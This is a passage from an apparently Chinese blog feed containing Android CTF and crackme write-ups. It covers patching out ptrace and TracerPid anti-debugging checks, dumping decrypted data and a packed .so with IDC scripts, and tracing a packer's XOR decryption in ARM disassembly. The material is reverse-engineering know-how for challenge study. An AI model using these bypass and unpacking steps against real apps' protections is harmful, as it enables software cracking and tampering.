.text:00001D28             JNI_OnLoad
.text:00001D28 08 B5                       PUSH    {R3,LR}
.text:00001D2A 00 20                       MOVS    R0, #0          ; request
.text:00001D2C 01 1C                       MOVS    R1, R0
.text:00001D2E 02 1C                       MOVS    R2, R0
.text:00001D30 03 1C                       MOVS    R3, R0
.text:00001D32 00 F0 B7 FF                 BL      j_j_ptrace      ; ptrace(0, 0, 0, 0) //跟踪自己，IDA无法附加
.text:00001D36 01 48                       LDR     R0, =0x10004
.text:00001D38 08 BD                       POP     {R3,PC}
.text:00001D38             ; End of function JNI_OnLoad
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BL j_j_ptrace&lt;/code&gt;patch掉，或者做全套，前面的参数赋值全都patch掉&lt;/p&gt;

&lt;p&gt;IDA的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Edit-&amp;gt;Patch Program-&amp;gt;Change byte&lt;/code&gt;可以实现直接修改so的功能&lt;/p&gt;

&lt;p&gt;可以看到这一句是4字节，所以使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00 00 00 00&lt;/code&gt;来替换，效果如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/8B4C9D417A41BFF70517F959FEC96FBF.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是这时函数尾识别出错了，需要修复一下函数&lt;/p&gt;

&lt;p&gt;使用右键&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Edit Function&lt;/code&gt;，修改函数尾部地址&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1096F888EA9D157F4BC11E746752CCD2.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;修改完&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/DAA75B5662B9B6EB2A13E71C0D47CEF7.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另外一处校验是TracerPid检测反调试，我们使用一种优雅的方式去处理&lt;/p&gt;

&lt;p&gt;修改这个函数的返回值就行&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001AD8                             EXPORT Java_com_zctf_app_JNIclass_add
.text:00001AD8             Java_com_zctf_app_JNIclass_add
.text:00001AD8 08 B5                       PUSH    {R3,LR}
.text:00001ADA FF F7 E9 FC                 BL      sub_14B0
.text:00001ADE 08 BD                       POP     {R3,PC}
.text:00001ADE             ; End of function Java_com_zctf_app_JNIclass_add
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接下来记得&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apply change&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;替换源so文件，重打包签名，进行动态调试&lt;/p&gt;

&lt;p&gt;如果碰到动态调试断不下来，可以使用在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libdvm.so&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dvmJNIUseBridge&lt;/code&gt;函数下断点的方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C1871D187EAD0BDBE99ABB85526CE5E8.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;释放前下断，找到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R0&lt;/code&gt;指向的堆空间，可以看到解密出来的是一个PNG文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/306EFBADAF7055391198CB5E5D5625D9.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;知道起始地址，整个堆空间长度是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1460&lt;/code&gt;，我们可以直接用脚本拷贝这片堆数据，走一个&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auto fp, dex_addr, end_addr;  
fp = fopen(&quot;E:\\Picture.png&quot;, &quot;wb&quot;);  
for(dex_addr = 0xB7E5BF58; dex_addr &amp;lt; 0xB7E5BF58 + 0x1460; dex_addr++)
    fputc(Byte(dex_addr), fp);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后使用StegSolve进行处理&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F471736AD5B5BC1A93B3337F73F7AA10.png&quot; alt=&quot;10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后，有个很玄学的问题，为了找到为什么一开始写代码解密会出错的原因，我特意看了一下秘钥&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CDB1F386FEBEA9A75EF8A4336BCF6BBE.png&quot; alt=&quot;11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;喵喵喵~~~&lt;/p&gt;

&lt;p&gt;那看来，是我代码写挫了，到这里告一段落吧，让我休息几天，现在的CTF题WriteUp真难写。。。。。。&lt;/p&gt;

&lt;p&gt;师傅们出题能少些套路多些真诚吗？&lt;/p&gt;

&lt;p&gt;爱你们&lt;/p&gt;
</description>
                <pubDate>Fri, 15 Sep 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/09/15/2016-ZCTF-android1-200.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/09/15/2016-ZCTF-android1-200.html</guid>
            </item>
        
            <item>
                <title>2014 NAGA&PIOWIND APP应用攻防竞赛 - crackme.l4.sign</title>
                <description>&lt;p&gt;Java层比较简单&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/729F23F05581B500ECBA2FF1F882D514.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;查看so，发现加密，依旧dump，IDA调试时未发现有反调试，不过有那么一瞬间看到了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inotify&lt;/code&gt;，没具体看&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auto fp, dex_addr, end_addr;  
fp = fopen(&quot;E:\\libcrackme.so&quot;, &quot;wb&quot;);  
for(dex_addr = 0xA357D000; dex_addr &amp;lt; 0xA35DE000; dex_addr++)
    fputc(Byte(dex_addr), fp);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修复dump后的so文件头，使用IDA打开，关键的依旧是这个函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F11E1E8409E1E2B5E2D39F2A08CCF319.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是我们跟入后，发现壳好像没有脱干净（后来发现其实不是没脱干净）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/9B59DB5BBEC0C80300968F7E6C5598F2.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再次动态调试脱壳，这次我们找到校验函数，单步跟下去看看具体是什么情况&lt;/p&gt;

&lt;p&gt;我们需要先找到校验函数的地址，使用给&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dvmUseJNIBridge&lt;/code&gt;函数下断点的方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/AE96DAA7C380FAFFD47956B551A672CB.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们使用调试模式启动应用，IDA挂上去，找到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libdvm.so&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dvmUseJNIBridge&lt;/code&gt;函数，下断点&lt;/p&gt;

&lt;p&gt;然后把IDA跑起来，在应用界面输入账号密码，点击登录，就可以发现断在这里了，我们注意观察参数，第二个参数就是我们的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackme&lt;/code&gt;函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C6BF6C879306ADADAF77C2B1A2D99F75.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟过去，可以看到确实是校验函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E088048C6478510C7DBDA7556973196E.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;找到我们看到是跳转地址的地方&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/BA2BC211D65FE53F559B390A8F4AB32A.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;双击过去&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E5AB4F7BB8FF0252528356596200CC3A.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再次双击过去，发现是关键加解密点了，此时我们记录一下这个地址&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3FA0182980B36B78B72DF09754CB85E1.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再次dump这个so文件&lt;/p&gt;

&lt;p&gt;动静结合，接下来看能力了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0EC7B8CD2BB1CE8F2A910F4BF0268E81.png&quot; alt=&quot;10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;入口的数据初始化，然后调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_Unwind_GetCFAB&lt;/code&gt;，这和前几题是类似的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E7164308A313E2F607131E81260C065A.png&quot; alt=&quot;11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟入，开始做了一些参数的存储操作，然后存储了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_Unwind_GetCFAB&lt;/code&gt;函数的指针到栈中&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:0002DB28 STMFD           SP!, {R4,R11,LR}
LOAD:0002DB2C ADD             R11, SP, #8
LOAD:0002DB30 SUB             SP, SP, #0x24
LOAD:0002DB34 LDR             R4, =(off_46CC8 - 0x2DB40)
LOAD:0002DB38 ADD             R4, PC, R4 ; off_46CC8 ; 神奇的地址，暂时不知道干什么的
LOAD:0002DB3C STR             R0, [R11,#var_20] ; R0 = var_20 = szUserName
LOAD:0002DB40 STR             R1, [R11,#var_24] ; R1 = var_24 = szRegCode
LOAD:0002DB44 MOV             R3, #0  ; R3 = 0
LOAD:0002DB48 STR             R3, [R11,#var_18] ; R3 = var_18 = 0
LOAD:0002DB4C LDR             R3, =dword_2CC ; R3 = 0x2CC
LOAD:0002DB50 LDR             R3, [R4,R3]
LOAD:0002DB54 LDR             R3, [R3]
LOAD:0002DB58 STR             R3, [R11,#var_14] ; var_14为_Unwind_GetCFAB函数指针
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;一开始并没有看出来，所以使用了动态调试来确定&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/125343C2DA359FAAFF16938734BC20EC.png&quot; alt=&quot;12.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下来的操作是为了调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tdog_decrypt&lt;/code&gt;而做参数的计算&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:0002DB5C LDR             R3, =dword_2CC ; R3 = 0x2CC
LOAD:0002DB60 LDR             R3, [R4,R3]
LOAD:0002DB64 LDR             R3, [R3] ; R3 = _Unwind_GetCFAB
LOAD:0002DB68 ADD             R3, R3, #0x14 ; R3 = _Unwind_GetCFAB + 0x14
LOAD:0002DB6C MOV             R1, R3  ; R1 = R3 = R3 = _Unwind_GetCFAB + 0x14
LOAD:0002DB70 LDR             R3, =dword_2B0 ; R3 = 0x2B0
LOAD:0002DB74 LDR             R3, [R4,R3]
LOAD:0002DB78 LDR             R3, [R3] ; 动调 : R3 = 0x104
LOAD:0002DB7C SUB             R2, R3, #0x14 ; R2 = 0xF0
LOAD:0002DB80 LDR             R3, =dword_2CC ; R3 = 0x2CC
LOAD:0002DB84 LDR             R3, [R4,R3]
LOAD:0002DB88 LDR             R3, [R3] ; R3 = _Unwind_GetCFAB
LOAD:0002DB8C ADD             R3, R3, #0x14 ; R3 = _Unwind_GetCFAB + 0x14
LOAD:0002DB90 LDR             R0, =dword_1D4 ; R0 = 0x1D4
LOAD:0002DB94 LDR             R0, [R4,R0]
LOAD:0002DB98 LDR             R0, [R0]
LOAD:0002DB9C STR             R0, [SP,#0x2C+var_2C] ; var_2C = abs_export_function_key
LOAD:0002DBA0 MOV             R0, R1  ; R0 = _Unwind_GetCFAB + 0x14
LOAD:0002DBA4 MOV             R1, R2  ; R1 = R2 = 0xF0
LOAD:0002DBA8 MOV             R2, R3  ; R3 = _Unwind_GetCFAB + 0x14
LOAD:0002DBAC LDR             R3, =dword_314 ; R3 = 0x314
LOAD:0002DBB0 LDR             R3, [R4,R3] ; 指向内存
LOAD:0002DBB4 BL              tdog_decrypt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;看名字就可以猜到这个函数很重要了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tdog_decrypt(_Unwind_GetCFAB + 0x14, 0xF0, _Unwind_GetCFAB + 0x14, 某内存变量指针)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;双击跟入，发现其调用了一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XorArray()&lt;/code&gt;函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000387F8 STMFD           SP!, {R11,LR}
LOAD:000387FC ADD             R11, SP, #4
LOAD:00038800 SUB             SP, SP, #0x10
LOAD:00038804 ; 5:   v5 = a2;
LOAD:00038804 STR             R0, [R11,#var_8] ; R0 = var_8 = _Unwind_GetCFAB + 0x14
LOAD:00038808 STR             R1, [R11,#var_C] ; R1 = var_C = 0xF0
LOAD:0003880C ; 6:   v6 = a4;
LOAD:0003880C STR             R2, [R11,#var_10] ; R2 = var_10 = _Unwind_GetCFAB + 0x14
LOAD:00038810 STR             R3, [R11,#var_14] ; R3 = var_14 = 第四个参数，为一个指针
LOAD:00038814 ; 7:   XorArray(a5, a1, a1, a2);
LOAD:00038814 LDR             R2, [R11,#var_8] ; R2 = _Unwind_GetCFAB + 0x14
LOAD:00038818 LDR             R3, [R11,#var_8] ; R3 = _Unwind_GetCFAB + 0x14
LOAD:0003881C LDR             R0, [R11,#arg_0] ; 动调 : R0 = 0x5F7C8B38
LOAD:00038820 MOV             R1, R2  ; R1 = R2 = _Unwind_GetCFAB + 0x14
LOAD:00038824 MOV             R2, R3  ; R2 = R3 = _Unwind_GetCFAB + 0x14
LOAD:00038828 LDR             R3, [R11,#var_C] ; R3 = 0xF0
LOAD:0003882C BL              _Z8XorArrayjPhS_j ; XorArray(uint,uchar *,uchar *,uint)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XorArray&lt;/code&gt;函数里有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PolyXorKey&lt;/code&gt;函数，用于生成秘钥，这个函数在后续的娜迦壳里面是一个比较重要的特征，后续的类抽取技术里就有用到这个函数进行秘钥的计算&lt;/p&gt;

&lt;p&gt;我一直觉得这里加了junk code，前面有些指令反复做同样的操作时我就感觉出来了，但是加的junk code并不是很多，比如这该函数的第一个函数块后面的几句&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00038D7C STMFD           SP!, {R11,LR}
LOAD:00038D80 ADD             R11, SP, #4
LOAD:00038D84 SUB             SP, SP, #0x20
LOAD:00038D88 ; 10:   v6 = a2;
LOAD:00038D88 STR             R0, [R11,#var_18] ; var_18 = 0X5F7C8B38 //神秘变量
LOAD:00038D8C STR             R1, [R11,#var_1C] ; var_1C = _Unwind_GetCFAB + 0x14
LOAD:00038D90 ; 11:   v5 = a3;
LOAD:00038D90 STR             R2, [R11,#var_20] ; var_20 = _Unwind_GetCFAB + 0x14
LOAD:00038D94 ; 12:   v4 = a4;
LOAD:00038D94 STR             R3, [R11,#var_24] ; var_24 = 0xF0
LOAD:00038D98 ; 13:   v7 = result;
LOAD:00038D98 LDR             R3, [R11,#var_18] ; R3 = 0X5F7C8B38 //神秘，神秘
LOAD:00038D9C STR             R3, [R11,#var_14] ; var_14 = 0X5F7C8B38 //又是神秘
LOAD:00038DA0 ; 14:   v8 = &amp;amp;v7;
LOAD:00038DA0 SUB             R3, R11, #-var_14
LOAD:00038DA4 STR             R3, [R11,#var_10] ; R3存储的是神秘变量0X5F7C8B38的指针
LOAD:00038DA8 ; 15:   v10 = 0;
LOAD:00038DA8 MOV             R3, #0  ; R3 = 0
LOAD:00038DAC STR             R3, [R11,#var_C] ; var_C = 0
LOAD:00038DB0 MOV             R3, #0  ; R3 = 0
LOAD:00038DB4 STR             R3, [R11,#var_8] ; var_8 = 0
LOAD:00038DB8 ; 16:   for ( i = 0; v4 &amp;gt; i; ++i )
LOAD:00038DB8 MOV             R3, #0  ; R3 = 0
LOAD:00038DBC STR             R3, [R11,#var_C] ; R3 = 0
LOAD:00038DC0 B               loc_38E40
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;开始进入循环&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00038E40 loc_38E40               ;
LOAD:00038E40 LDR             R2, [R11,#var_24] ; R2 = 0xF0 = 240
LOAD:00038E44 LDR             R3, [R11,#var_C] ; R3 = i
LOAD:00038E48 CMP             R2, R3
LOAD:00038E4C MOVLE           R3, #0
LOAD:00038E50 MOVGT           R3, #1  ; 循环中使用这一句 : i &amp;lt; 240 --- &amp;gt; R3 = 1
LOAD:00038E54 AND             R3, R3, #0xFF ; 用于判断是否到达退出条件
LOAD:00038E58 CMP             R3, #0
LOAD:00038E5C BNE             loc_38DC4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;两个基址获取字节数据，进行异或操作，异或后的数据，存在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_Unwind_GetCFAB + 0x14 + i&lt;/code&gt;指向的字节&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00038DC4 ; 19:     v5[i] = v6[i] ^ *((_BYTE *)v8 + v10);
LOAD:00038DC4 loc_38DC4               ;
LOAD:00038DC4 LDR             R3, [R11,#var_C] ; R3 = i
LOAD:00038DC8 LDR             R2, [R11,#var_20] ; R2 = _Unwind_GetCFAB + 0x14
LOAD:00038DCC ADD             R3, R2, R3 ; R3 = _Unwind_GetCFAB + 0x14 + i
LOAD:00038DD0 LDR             R2, [R11,#var_C] ; R2 = i
LOAD:00038DD4 LDR             R1, [R11,#var_1C] ; R1 = _Unwind_GetCFAB + 0x14
LOAD:00038DD8 ADD             R2, R1, R2 ; R2 = _Unwind_GetCFAB + 0x14 + i
LOAD:00038DDC ; 18:     result = (int)v8;
LOAD:00038DDC LDRB            R1, [R2] ; 取第一个字节，动调 : R1 = 0xBB
LOAD:00038DE0 LDR             R2, [R11,#var_8] ; R2 = j
LOAD:00038DE4 LDR             R0, [R11,#var_10] ; R0为神秘变量指针
LOAD:00038DE8 ADD             R2, R0, R2 ; R2 = 神秘变量指针 + j
LOAD:00038DEC LDRB            R2, [R2] ; 取第一个字节，动调 : 0x38
LOAD:00038DF0 EOR             R2, R1, R2 ; 两个取出来的字节异或
LOAD:00038DF4 AND             R2, R2, #0xFF
LOAD:00038DF8 STRB            R2, [R3]
LOAD:00038DFC ; 20:     if ( v10 == 3 )
LOAD:00038DFC LDR             R3, [R11,#var_8]
LOAD:00038E00 CMP             R3, #3
LOAD:00038E04 BNE             loc_38E28
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里是在计算一个四字节的数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/5BE7D64D585CA33537ACA67889C11459.png&quot; alt=&quot;13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们在内存中跟随，可以看到这四个字节的数据已经修改成了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;83 93 00 23&lt;/code&gt;，不清楚的同学可以在异或的地方下个断点循环调试看看&lt;/p&gt;

&lt;p&gt;接着是调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PolyXorKey&lt;/code&gt;，参数是神秘变量自身&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00038E08 ; 22:       result = PolyXorKey(v7);
LOAD:00038E08 LDR             R3, [R11,#var_14] ; 取出神秘变量
LOAD:00038E0C MOV             R0, R3  ; 神秘变量作为参数R0
LOAD:00038E10 BL              _Z10PolyXorKeyj ; PolyXorKey(
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;先使用异或操作对神秘变量进行修改&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00038BC8 STR             R11, [SP,#-4+var_s0]!
LOAD:00038BCC ADD             R11, SP, #0
LOAD:00038BD0 SUB             SP, SP, #0x24
LOAD:00038BD4 ; 11:   v4 = 0;
LOAD:00038BD4 STR             R0, [R11,#var_20] ; var_20 = 神秘变量
LOAD:00038BD8 MOV             R3, #0  ; R3 = 0
LOAD:00038BDC STR             R3, [R11,#var_18] ; var_18 = 0
LOAD:00038BE0 MOV             R3, #0  ; R3 = 0
LOAD:00038BE4 STR             R3, [R11,#var_14] ; var_14 = 0
LOAD:00038BE8 ; 12:   v5 = 0;
LOAD:00038BE8 MOV             R3, #0  ; R3 = 0
LOAD:00038BEC STR             R3, [R11,#var_10] ; var_10 = 0
LOAD:00038BF0 ; 13:   v6 = (char *)&amp;amp;v2;
LOAD:00038BF0 SUB             R3, R11, #-var_20
LOAD:00038BF4 STR             R3, [R11,#var_C] ; var_C为神秘变量指针
LOAD:00038BF8 ; 14:   v7 = 0;
LOAD:00038BF8 MOV             R3, #0  ; R3 = 0
LOAD:00038BFC STRB            R3, [R11,#var_7] ; var_7指向的byte为0
LOAD:00038C00 ; 15:   v8 = 0;
LOAD:00038C00 MOV             R3, #0
LOAD:00038C04 STRB            R3, [R11,#var_6] ; var_6指向的byte为0
LOAD:00038C08 ; 16:   v9 = 0;
LOAD:00038C08 MOV             R3, #0
LOAD:00038C0C STRB            R3, [R11,#var_5] ; var_5指向的byte为0
LOAD:00038C10 ; 17:   v2 = a1 ^ 0xDF138530;
LOAD:00038C10 LDR             R3, [R11,#var_20] ; R3 = 神秘变量
LOAD:00038C14 MOV             R2, R3  ; R2 = R3 = 神秘变量
LOAD:00038C18 LDR             R3, =0xDF138530 ; R3 = 0xDF138530
LOAD:00038C1C EOR             R3, R2, R3 ; 神秘变量异或 ---&amp;gt; R3 = 0x5F7C8B38 ^ 0xDF138530
LOAD:00038C20 STR             R3, [R11,#var_20] ; 修改神秘变量为0x806F0E08
LOAD:00038C24 ; 18:   v3 = 0;
LOAD:00038C24 MOV             R3, #0  ; R3 = 0
LOAD:00038C28 STR             R3, [R11,#var_18] ; var_18 = 0
LOAD:00038C2C B               loc_38D48
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;进入大循环，整个大循环就是循环计算神秘变量的四个字节，但是内部又有很多的循环计算&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00038D48 ; 19:   while ( v3 &amp;lt;= 3 )
LOAD:00038D48 loc_38D48               ; 开始循环计算
LOAD:00038D48 LDR             R3, [R11,#var_18] ; R3 = i
LOAD:00038D4C CMP             R3, #3  ; 条件判断 i &amp;lt; 4
LOAD:00038D50 MOVGT           R3, #0
LOAD:00038D54 MOVLE           R3, #1
LOAD:00038D58 AND             R3, R3, #0xFF
LOAD:00038D5C CMP             R3, #0
LOAD:00038D60 BNE             loc_38C30
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;取字节，这里的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_C&lt;/code&gt;会在后面自加一&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00038C30 ; 21:     v7 = *v6;
LOAD:00038C30 loc_38C30               ;
LOAD:00038C30 LDR             R3, [R11,#var_C] ; R3为神秘变量指针
LOAD:00038C34 LDRB            R3, [R3] ; 获取计算后的神秘变量的字节
LOAD:00038C38 STRB            R3, [R11,#var_7] ; var_7 = 08
LOAD:00038C3C ; 22:     v4 = 128;
LOAD:00038C3C MOV             R3, #0x80 ; '€' ; R3 = 0x80
LOAD:00038C40 STR             R3, [R11,#var_14] ; var_14 = 0x80
LOAD:00038C44 ; 23:     v5 = 7;
LOAD:00038C44 MOV             R3, #7  ; R3 = 0x7
LOAD:00038C48 STR             R3, [R11,#var_10] ; var_10 = 0x7
LOAD:00038C4C B               loc_38CE0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;内部的循环&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00038CE0 ; 24:     while ( v4 &amp;gt; 1 )
LOAD:00038CE0
LOAD:00038CE0 loc_38CE0               ;
LOAD:00038CE0 LDR             R3, [R11,#var_14] ; R3 = 0x80
LOAD:00038CE4 CMP             R3, #1
LOAD:00038CE8 MOVLE           R3, #0
LOAD:00038CEC MOVGT           R3, #1
LOAD:00038CF0 AND             R3, R3, #0xFF
LOAD:00038CF4 CMP             R3, #0
LOAD:00038CF8 BNE             loc_38C50
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接下来的循环计算可以还原出C代码，但是具体是什么数学算法之类的就不是很清楚了，可能只是个计算，这个函数最终的功能目测应该是计算一个四字节的数据作为返回值&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00038C50 ; 27:       v8 = ((signed int)(unsigned __int8)(v7 &amp;amp; v4) &amp;gt;&amp;gt; v5) ^ v9;
LOAD:00038C50 loc_38C50               ; 进入循环，重命名神秘变量为sec
LOAD:00038C50 LDRB            R2, [R11,#var_7] ; R2 = 0x08
LOAD:00038C54 LDR             R3, [R11,#var_14] ; R3 = 0x80
LOAD:00038C58 AND             R2, R2, R3 ; R2 = sec[i] &amp;amp; 0x80
LOAD:00038C5C LDR             R3, [R11,#var_10] ; R3 = 0x07
LOAD:00038C60 MOV             R3, R2,ASR R3 ; R3 = (sec[i] &amp;amp; 0x80) / 0x07
LOAD:00038C64 ; 26:       v9 = (v7 &amp;amp; v4 / 2) &amp;gt;&amp;gt; (v5 - 1);
LOAD:00038C64 STRB            R3, [R11,#var_6] ; var_6 = (sec[i] &amp;amp; 0x80) / 0x07
LOAD:00038C68 LDRB            R2, [R11,#var_7] ; R2 = sec[i]
LOAD:00038C6C LDR             R3, [R11,#var_14] ; R3 = 0x80
LOAD:00038C70 MOV             R1, R3,LSR#31 ; R1 = 0x00000080 &amp;gt;&amp;gt; 31 = 0
LOAD:00038C74 ADD             R3, R1, R3 ; R3 = 0x80
LOAD:00038C78 MOV             R3, R3,ASR#1 ; R3 = 0x80 / 2
